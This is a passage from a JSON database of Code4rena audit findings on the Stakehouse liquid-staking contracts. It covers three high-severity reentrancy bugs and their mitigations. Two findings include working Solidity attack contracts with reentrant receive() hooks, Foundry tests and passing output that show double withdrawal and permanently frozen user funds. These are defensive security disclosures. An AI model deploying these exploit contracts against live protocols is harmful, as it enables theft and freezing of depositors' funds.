lpTokenETH.burn(msg.sender, amount);\n\n                emit LPBurnedForDETH(address(token), msg.sender, amount);\n            }\n\n            // Ask\n            vault.burnLPTokens(_lpTokens[i], _amounts[i]);\n        }\n\n        // Calculate how much dETH has been received from burning\n        dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;\n\n        // Send giant LP holder dETH owed\n        getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);\n    }\n```\nAs you can see first contract save the dETH balance of contract by this line: `uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));` and then it loops through user provided vaults addresses and call those vaults to withdraw dETH and in the end it calculates `dETHReceivedFromAllSavETHVaults` and transfer those dETH to user: ` getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);`. attacker can perform these steps:\n1- create a malicious contract `AttackerVault` which is copy of `SavETHVault` with modifiction.\n2- call `withdrawDETH()` with Vault list `[ValidVault1, ValidVault2, AttackerVault, ValidVaul3]`.\n3- contract would save the dETH balance of itself and then loops through Vaults to validate and burn LPTokens.\n4- contract would reach Vault `AttackerVault` and call attacker controlled address.\n5- attacker contract call other functions to increase dETH balance of contract (if it's not possible to increase dETH balance of contract by other way so there is no need to save contract initial balance of dETH before the loop and dETH balance of contract would be zero always)\n6- `withdrawDETH()` would finish the loop and transfer all the increase dETH balance to attacker which includes extra amounts.\n\nbecause contract don't check the provided addresses and calls them and there is no reentrancy defense mechanism there is possibility of reentrancy attack which can cause fund lose.\n\n## Tools Used\nVIM\n\n## Recommended Mitigation Steps\ncheck the provided addresses and also have some reentrancy defence mechanisim.",
      "summary": "\nThis bug report is about a vulnerability in the `withdrawDETH()` function in the `GiantSavETHVaultPool` contract. This function allows users to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults. The problem is that the function calls external addresses provided by the user without checking them, and this can allow a malicious user to take control of the transaction by providing a malicious address. This can result in the malicious user increasing the dETH balance of the contract and transferring it to themselves.\n\nThe proof of concept involves a malicious user providing a malicious contract address in the `withdrawDETH()` call. This malicious contract can increase the dETH balance of the contract and transfer it to the malicious user.\n\nThe tool used for this report was VIM.\n\nTo mitigate this vulnerability, it is recommended to check the provided addresses and also to have some reentrancy defense mechanism.",
      "report_date": {},
      "contest_prize_txt": "$90,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
      "sponsor_name": "Stakehouse Protocol",
      "sponsor_link": "https://twitter.com/blockswap_team",
      "quality_score": 3.6666666666666665,
      "general_score": 3.6666666666666665,
      "source_link": "https://code4rena.com/reports/2022-11-stakehouse",
      "github_link": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/226",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "182",
      "slug": "h-13-possible-reentrancy-and-fund-theft-in-withdrawdeth-of-giantsavethvaultpool-because-there-is-no-whitelist-check-for-user-provided-vaults-and-there-is-no-reentrancy-defense-code4rena-stakehouse-protocol-lsd-network-stakehouse-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Stakehouse Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Stakehouse Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "5898",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "106",
      "title": "[H-11] Protocol insolvent - Permanent freeze of funds",
      "content": "\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524><br>\n\n*   Permanent freeze of funds - users who deposited ETH for staking will not be able to receive their funds, rewards or rotate to another token. The protocol becomes insolvent, it cannot pay anything to the users.\n*   Protocol's LifecycleStatus state machine is broken\n\nOther impacts:\n\n*   Users deposit funds to an unstakable validator (node runner has already took out his funds)\n\nImpact is also on the Giant Pools that give liquidity to the vaults.\n\nA competitor or malicious actor can cause bad PR for the protocol by causing permanent freeze of user funds at LSD stakehouse.\n\n### Proof of Concept\n\nThere are two main bugs that cause the above impact:\n\n1.  Reentrancy bug in `withdrawETHForKnot` function in `LiquidStakingManager.sol`\n2.  Improper balance check in `LiquidStakingManager.sol` for deposited node runner funds.\n\nFor easier reading and understanding, please follow the below full attack flow diagram when reading through the explanation.\n\n    ┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐\n    │           │               │           │            │           │              │           │\n    │Node Runner│               │LSD Manager│            │   Vaults  │              │   Users   │\n    │           │               │           │            │           │              │           │\n    └─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘\n          │                           │                        │                          │\n          │   Register BLS Key #1     │                        │                          │\n          ├──────────────────────────►│                        │                          │\n          │                           │                        │                          │\n          │   Register BLS Key #1     │                        │                          │\n          ├──────────────────────────►│                        │Deposit 24 ETH to savETH  │\n          │                           │                        │◄─────────────────────────┤\n          │                           │                        │                          │\n          │                           │                        │Deposit 4 ETH to mevAndFees\n          │                           │                        │◄─────────────────────────┐\n          │WithdrawETHForKnot BLS #1  │                        │                          │\n          ├──────────────────────────►│                        │                          │\n          │       Send 4 ETH          │                        │                          │\n          │◄──────────────────────────┤                        │                          │\n          │ Reenter stake function    │                        │                          │\n          ├──────────────────────────►│Get 28 ETH from vaults  │                          │\n          │                           ├───────────────────────►│                          │\n          │ ┌───────────────────────┐ │     Send 28 ETH        │                          │\n          │ │ Stake complete.       │ │◄───────────────────────┤                          │\n          │ │status=DEPOSIT_COMPLETE│ │                        │                          │\n          │ └───────────────────────┘ │                        │                          │\n          │Finished WithdrawETHForKnot│                        │                          │\n          │◄──────────────────────────┤                        │Users cannot mint derivati│es\n          │                           │                        │◄─────────────────────────┤\n          │    ┌──────────────────┐   │                        │Users cannot burnLPTokens │\n          │    │BLS Key #1 banned │   │                        │◄─────────────────────────┤\n          │    └──────────────────┘   │                        │Users cannot rotateTokens │\n          │                           │                        │◄─────────────────────────┤\n          │                           │                        │                          │\n\nLet's assume the following starting point:\n\n1.  Node runner registered and paid 4 ETH for BLS KEY `#1`\n2.  Node runner registered and paid 4 ETH for BLS KEY `#2`\n3.  savETH users collected 24 ETH ready for staking\n4.  mevAndFess users collected 4 ETH ready for staking\n\n**Reentrancy in `withdrawETHForKnot`**:\n\n`withdrawETHForKnot` is a function used in `LiquidStakingManager`. It is used to refund a node runner if funds are not yet staked and BAN the BLS key.\n\n`withdrawETHForKnot`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326>\n\n        function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {\n    ....\n            IOwnableSmartWallet(associatedSmartWallet).rawExecute(\n                _recipient,\n                \"\",\n                4 ether\n            );\n    ....\n            bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n        }\n\nThe associatedSmartWallet will send the node runner 4 ETH (out of 8 currently in balance).\n\nPlease note:\n\n1.  The Node Runner can reenter the `LiquidStakingManager` when receiving the 4 ETH\n2.  `bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;` is only executed after the reentrancy\n\nWe can call any method we need with the following states:\n\n*   BLS key is NOT banned\n*   Status is `IDataStructures.LifecycleStatus.INITIALS_REGISTERED`\n\nThe node runner will call the `stake` function to stake the deposited funds from the vaults and change the status to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`\n\n`stake`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524>\n\n        function stake(\n            bytes[] calldata _blsPublicKeyOfKnots,\n            bytes[] calldata _ciphertexts,\n            bytes[] calldata _aesEncryptorKeys,\n            IDataStructures.EIP712Signature[] calldata _encryptionSignatures,\n            bytes32[] calldata _dataRoots\n        ) external {\n    ....\n                // check if BLS public key is registered with liquid staking derivative network and not banned\n                require(isBLSPublicKeyBanned(blsPubKey) == false, \"BLS public key is banned or not a part of LSD network\");\n    ....\n                require(\n                    getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                    \"Initials not registered\"\n                );\n    ....\n                _assertEtherIsReadyForValidatorStaking(blsPubKey);\n\n                _stake(\n                    _blsPublicKeyOfKnots[i],\n                    _ciphertexts[i],\n                    _aesEncryptorKeys[i],\n                    _encryptionSignatures[i],\n                    _dataRoots[i]\n                );\n    ....\n        }\n\nThe `stake` function checks\n\n1.  That the BLS key is not banned. In our case its not yet banned, because the banning happens after the reentrancy\n2.  IDataStructures.LifecycleStatus.INITIALS_REGISTERED is the current Lifecycle status. Which it is.\n3.  There is enough balance in the vaults and node runners smart wallet in `_assertEtherIsReadyForValidatorStaking`\n\n`_assertEtherIsReadyForValidatorStaking`  checks that the node runners smart wallet has more than 4 ETH.\nBecause our node runner has two BLS keys registered, there is an additional 4 ETH on BLS Key #2 and the conditions will pass.\n\n`_assertEtherIsReadyForValidatorStaking`<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934>\n\n        function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {\n            address associatedSmartWallet = smartWalletOfKnot[blsPubKey];\n            require(associatedSmartWallet.balance >= 4 ether, \"Smart wallet balance must be at least 4 ether\");\n\n            LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);\n            require(address(stakingFundsLP) != address(0), \"No funds staked in staking funds vault\");\n            require(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");\n\n            LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);\n            require(address(savETHVaultLP) != address(0), \"No funds staked in savETH vault\");\n            require(savETHVaultLP.totalSupply() == 24 ether, \"KNOT must have 24 ETH in savETH vault\");\n        }\n\nSince we can pass all checks. `_stake` will be called which withdraws all needed funds from the vault and executes a call through the smart wallet to the `TransactionRouter` with 32 ETH needed for the stake. The `TransactionRouter` will process the funds and stake them. The `LifecycleStatus` will be updated to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`\n\n`_stake`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L739>\n\n        function _stake(\n            bytes calldata _blsPublicKey,\n            bytes calldata _cipherText,\n            bytes calldata _aesEncryptorKey,\n            IDataStructures.EIP712Signature calldata _encryptionSignature,\n            bytes32 dataRoot\n        ) internal {\n            address smartWallet = smartWalletOfKnot[_blsPublicKey];\n\n            // send 24 ether from savETH vault to smart wallet\n            savETHVault.withdrawETHForStaking(smartWallet, 24 ether);\n\n            // send 4 ether from DAO staking funds vault\n            stakingFundsVault.withdrawETH(smartWallet, 4 ether);\n\n            // interact with transaction router using smart wallet to deposit 32 ETH\n            IOwnableSmartWallet(smartWallet).execute(\n                address(getTransactionRouter()),\n                abi.encodeWithSelector(\n                    ITransactionRouter.registerValidator.selector,\n                    smartWallet,\n                    _blsPublicKey,\n                    _cipherText,\n                    _aesEncryptorKey,\n                    _encryptionSignature,\n                    dataRoot\n                ),\n                32 ether\n            );\n    ....\n        }\n\nAfter `_stake` and `stake` will finish executing we will finish the Cross-Function Reentrancy.\n\nThe protocol has entered the following state for the BLS key `#1`:\n\n1.  BLS Key `#1` is banned\n2.  LifecycleStatus is `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`\n\nIn such a state where the key is banned, no one can mint derivatives and therefor depositors cannot withdraw rewards/dETH:\n\n`mintDerivatives`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L577>\n\n        function mintDerivatives(\n            bytes[] calldata _blsPublicKeyOfKnots,\n            IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,\n            IDataStructures.EIP712Signature[] calldata _reportSignatures\n        ) external {\n    ....\n                // check if BLS public key is registered and not banned\n                require(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is banned or not a part of LSD network\");\n    ....\n\nVault LP Tokens cannot be burned for withdraws because that is not supported in `DEPOSIT_COMPLETE` state:\n\n`burnLPToken`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126>\n\n        function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) {\n    ...\n            bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];\n            IDataStructures.LifecycleStatus validatorStatus = getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot);\n\n            require(\n                validatorStatus == IDataStructures.LifecycleStatus.INITIALS_REGISTERED ||\n                validatorStatus == IDataStructures.LifecycleStatus.TOKENS_MINTED,\n                \"Cannot burn LP tokens\"\n            );\n    ....\n\nTokens cannot be rotated to other LP tokens because that is not supported in a DEPOSIT_COMPLETE state\n\n`rotateLPTokens`\n\n        function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {\n    ...\n            bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken];\n    ...\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Lifecycle status must be one\"\n            );\n    ...\n\nFunds are stuck, they cannot be taken or used.<br>\nThe LifecycleStatus is also stuck, tokens cannot be minted.\n\n#### Foundry POC\n\nThe POC will showcase the scenario in the diagram.\n\nAdd the following contracts to `liquid-staking` folder:<br>\n<https://github.com/coade-423n4/2022-11-stakehouse/tree/main/contracts/testing/liquid-staking>\n\n    // SPDX-License-Identifier: MIT\n\n    pragma solidity 0.8.13;\n\n    import { LiquidStakingManager } from \"../../liquid-staking/LiquidStakingManager.sol\";\n    import { TestUtils } from \"../../../test/utils/TestUtils.sol\";\n\n    contract NodeRunner {\n        bytes blsPublicKey1;\n        LiquidStakingManager manager;\n        TestUtils testUtils;\n\n        constructor(LiquidStakingManager _manager, bytes memory _blsPublicKey1, bytes memory _blsPublicKey2, address _testUtils) payable public {\n            manager = _manager;\n            blsPublicKey1 = _blsPublicKey1;\n            testUtils = TestUtils(_testUtils);\n            //register BLS Key #1\n            manager.registerBLSPublicKeys{ value: 4 ether }(\n                testUtils.getBytesArrayFromBytes(blsPublicKey1),\n                testUtils.getBytesArrayFromBytes(blsPublicKey1),\n                address(0xdeadbeef)\n            );\n            // Register BLS Key #2\n            manager.registerBLSPublicKeys{ value: 4 ether }(\n                testUtils.getBytesArrayFromBytes(_blsPublicKey2),\n                testUtils.getBytesArrayFromBytes(_blsPublicKey2),\n                address(0xdeadbeef)\n            );\n        }\n        receive() external payable {\n            testUtils.stakeSingleBlsPubKey(blsPublicKey1);\n        }\n    }\n\nAdd the following imports to `LiquidStakingManager.t.sol`<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12>\n\n    import { NodeRunner } from \"../../contracts/testing/liquid-staking/NodeRunner.sol\";\n    import { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nAdd the following test to `LiquidStakingManager.t.sol`<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L121>\n\n```\n    function testLockStakersFunds() public {\n        uint256 startAmount = 8 ether;\n        // Create NodeRunner. Constructor registers two BLS Keys\n        address nodeRunner = address(new NodeRunner{value: startAmount}(manager, blsPubKeyOne, blsPubKeyTwo, address(this)));\n        \n        // Simulate state transitions in lifecycle status to initials registered (value of 1)\n        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);\n\n        // savETHUser, feesAndMevUser funds used to deposit into validator BLS key #1\n        address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);\n        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n        \n        // deposit savETHUser, feesAndMevUser funds for validator #1\n        depositIntoDefaultSavETHVault(savETHUser, blsPubKeyOne, 24 ether);\n        depositIntoDefaultStakingFundsVault(feesAndMevUser, blsPubKeyOne, 4 ether);\n\n        // withdraw ETH for first BLS key and reenter\n        // This will perform a cross-function reentracy to call stake\n        vm.startPrank(nodeRunner);\n        manager.withdrawETHForKnot(nodeRunner, blsPubKeyOne);\n        // Simulate state transitions in lifecycle status to ETH deposited (value of 2)\n        // In real deployment, when stake is called TransactionRouter.registerValidator is called to change the state to DEPOSIT_COMPLETE \n        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 2);\n        vm.stopPrank();\n        \n        // Validate mintDerivatives reverts because of banned public key \n        (,IDataStructures.ETH2DataReport[] memory reports) = getFakeBalanceReport();\n        (,IDataStructures.EIP712Signature[] memory sigs) = getFakeEIP712Signature();\n        vm.expectRevert(\"BLS public key is banned or not a part of LSD network\");\n        manager.mintDerivatives(\n            getBytesArrayFromBytes(blsPubKeyOne),\n            reports,\n            sigs\n        );\n\n        // Validate depositor cannot burn LP tokens\n        vm.startPrank(savETHUser);\n        vm.expectRevert(\"Cannot burn LP tokens\");\n        savETHVault.burnLPTokensByBLS(getBytesArrayFromBytes(blsPubKeyOne), getUint256ArrayFromValues(24 ether));\n        vm.stopPrank();\n    }\n\n```\n\nTo run the POC execute: ` yarn test -m testLockStakersFunds -v  `\n\nExpected output:\n\n    Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\n    [PASS] testLockStakersFunds() (gas: 1731537)\n    Test result: ok. 1 passed; 0 failed; finished in 8.21ms\n\nTo see the full trace, execute: `yarn test -m testLockStakersFunds -vvvv`\n\n### Tools Used\n\nVS Code, Foundry\n\n### Recommended Mitigation Steps\n\n1.  Add a reentrancy guard to `withdrawETHForKnot` and `stake`\n2.  Keep proper accounting for ETH deposited by node runner for each BLS key\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176)**\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the code of LiquidStakingManager.sol, which is part of the 2022-11-stakehouse repository on GitHub. This bug can be exploited to cause a permanent freeze of funds. This means that users who have deposited ETH for staking will not be able to receive their funds, rewards or rotate to another token, making the protocol insolvent and unable to pay anything to the users. Additionally, users will not be able to mint derivatives, burnLPTokens or rotateTokens.\n\nThe bug is caused by two main issues: a reentrancy bug in the `withdrawETHForKnot` function and an improper balance check in the same function for deposited node runner funds. Both of these issues combined can cause the node runner to reenter the LiquidStakingManager function when receiving 4 ETH, and then call the `stake` function to stake the deposited funds from the vaults and change the status to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`. This will cause the BLS key to be banned, leaving the users unable to withdraw their funds.\n\nTo prevent this bug from occurring, it is recommended to add a reentrancy guard to both the `withdrawETHForKnot` and `stake` functions, as well as to keep proper accounting for ETH deposited by node runner for each BLS key. To see the full trace, execute `yarn test -m testLockStakersFunds -vvvv` using the tools VS Code and Foundry.",
      "report_date": {},
      "contest_prize_txt": "$90,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
      "sponsor_name": "Stakehouse Protocol",
      "sponsor_link": "https://twitter.com/blockswap_team",
      "quality_score": 5,
      "general_score": 3,
      "source_link": "https://code4rena.com/reports/2022-11-stakehouse",
      "github_link": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "182",
      "slug": "h-11-protocol-insolvent-permanent-freeze-of-funds-code4rena-stakehouse-protocol-lsd-network-stakehouse-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Stakehouse Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Stakehouse Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "5892",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 6,
      "protocol_id": "106",
      "title": "[H-05] Reentrancy in LiquidStakingManager.sol#withdrawETHForKnow leads to loss of fund from smart wallet",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L435\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L340\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L347\n\n\n## Vulnerability details\n\n## Impact\n\nReentrancy in LiquidStakingManager.sol#withdrawETHForKnow leads to loss of fund from smart wallet\n\n## Proof of Concept\n\nthe code below violates the check effect pattern, the code banned the public key to mark the public key invalid to not let the msg.sender withdraw again after sending the ETH.\n\n```solidity\n    /// @notice Allow node runners to withdraw ETH from their smart wallet. ETH can only be withdrawn until the KNOT has not been staked.\n    /// @dev A banned node runner cannot withdraw ETH for the KNOT. \n    /// @param _blsPublicKeyOfKnot BLS public key of the KNOT for which the ETH needs to be withdrawn\n    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {\n        require(_recipient != address(0), \"Zero address\");\n        require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key has already withdrawn or not a part of LSD network\");\n\n        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];\n        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, \"Not the node runner for the smart wallet \");\n        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, \"Node runner is banned from LSD network\");\n        require(associatedSmartWallet.balance >= 4 ether, \"Insufficient balance\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Initials not registered\"\n        );\n\n        // refund 4 ether from smart wallet to node runner's EOA\n        IOwnableSmartWallet(associatedSmartWallet).rawExecute(\n            _recipient,\n            \"\",\n            4 ether\n        );\n\n        // update the mapping\n        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n        emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);\n    }\n```\n\nnote the section:\n\n```solidity\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n\n// update the mapping\nbannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n```\n\nif the _recipient is a smart contract, it can re-enter the withdraw function to withdraw another 4 ETH multiple times before the public key is banned.\n\nAs shown in our running POC.\n\nWe need to add the import first: \n\n```solidity\nimport { MockAccountManager } from \"../../contracts/testing/stakehouse/MockAccountManager.sol\";\n```\n\nWe can add the smart contract below:\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12\n\n```solidity\ninterface IManager {\n    function registerBLSPublicKeys(\n        bytes[] calldata _blsPublicKeys,\n        bytes[] calldata _blsSignatures,\n        address _eoaRepresentative\n    ) external payable;\n    function withdrawETHForKnot(\n        address _recipient, \n        bytes calldata _blsPublicKeyOfKnot\n    ) external;\n}\n\ncontract NonEOARepresentative {\n\n    address manager;\n    bool state;\n\n    constructor(address _manager) payable {\n\n        bytes[] memory publicKeys = new bytes[](2);\n        publicKeys[0] = \"publicKeys1\";\n        publicKeys[1] = \"publicKeys2\";\n\n        bytes[] memory signature = new bytes[](2);\n        signature[0] = \"signature1\";\n        signature[1] = \"signature2\";\n\n        IManager(_manager).registerBLSPublicKeys{value: 8 ether}(\n            publicKeys,\n            signature,\n            address(this)\n        );\n\n        manager = _manager;\n\n    }\n\n    function withdraw(bytes calldata _blsPublicKeyOfKnot) external {\n        IManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);\n    }\n\n    receive() external payable {\n        if(!state) {\n            state = true;\n            this.withdraw(\"publicKeys1\");\n        }\n    }\n\n}\n```\n\nthere is a restriction in this reentrancy attack, the msg.sender needs to be the same recipient when calling withdrawETHForKnot.\n\nWe add the test case.\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35\n\n```solidity\nfunction testBypassIsContractCheck_POC() public {\n\n\tNonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));\n\taddress wallet = manager.smartWalletOfNodeRunner(address(pass));\n\taddress reprenstative = manager.smartWalletRepresentative(wallet);\n\tconsole.log(\"smart contract registered as a EOA representative\");\n\tconsole.log(address(reprenstative) == address(pass));\n\n\t// to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED\n\tMockAccountManager(factory.accountMan()).setLifecycleStatus(\"publicKeys1\", 1);\n\n\t// expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER\n\tpass.withdraw(\"publicKeys1\");\n\tconsole.log(\"balance after the withdraw, expected 4 ETH, but has 8 ETH\");\n\tconsole.log(address(pass).balance);\n\n}\n```\n\nwe run the test:\n\n```solidity\nforge test -vv --match testWithdraw_Reentrancy_POC\n```\n\nand the result is\n\n```solidity\nRunning 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\n[PASS] testWithdraw_Reentrancy_POC() (gas: 578021)\nLogs:\n  smart contract registered as a EOA representative\n  true\n  balance after the withdraw, expected 4 ETH, but has 8 ETH\n  8000000000000000000\n\nTest result: ok. 1 passed; 0 failed; finished in 14.85ms\n```\n\nthe function call is \n\npass.withdraw(\"publicKeys1\"), which calls\n\n```solidity\nfunction withdraw(bytes calldata _blsPublicKeyOfKnot) external {\n\tIManager(manager).withdrawETHForKnot(address(this), _blsPublicKeyOfKnot);\n}\n```\n\nwhich trigger:\n\n```solidity\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n```\n\nwhich triggers reentrancy to withdraw the fund again before the public key is banned.\n\n```solidity\nreceive() external payable {\n\tif(!state) {\n\t\tstate = true;\n\t\tthis.withdraw(\"publicKeys1\");\n\t}\n}\n```\n\n\n## Tools Used\n\nManual Review\n\n## Recommended Mitigation Steps\n\nWe recommend ban the public key first then send the fund out, and use openzeppelin nonReentrant modifier to avoid reentrancy.\n\n```solidity\n\n// update the mapping\nbannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n\n// refund 4 ether from smart wallet to node runner's EOA\nIOwnableSmartWallet(associatedSmartWallet).rawExecute(\n\t_recipient,\n\t\"\",\n\t4 ether\n);\n```",
